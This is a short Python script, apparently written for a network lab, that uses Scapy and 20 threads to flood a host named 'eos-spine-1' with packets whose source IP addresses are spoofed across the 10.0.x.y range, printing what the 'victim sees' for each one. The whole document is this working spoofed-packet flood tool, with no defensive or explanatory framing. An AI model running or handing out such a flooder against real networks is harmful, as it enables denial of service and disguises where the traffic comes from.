from scapy.all import *
from threading import Thread

def sendPackets():
	for i in range(1,255):
		for j in range(1,255):
			packet = IP(dst="eos-spine-1",src="10.0." + str(i) + "." + str(j),ttl=25)/TCP()/UDP()
			send(packet)
			print("victim sees 10.0." + str(i) + "." + str(j))

for i in range(0,20):
	thread = Thread(target=sendPackets,args=())
	thread.start()
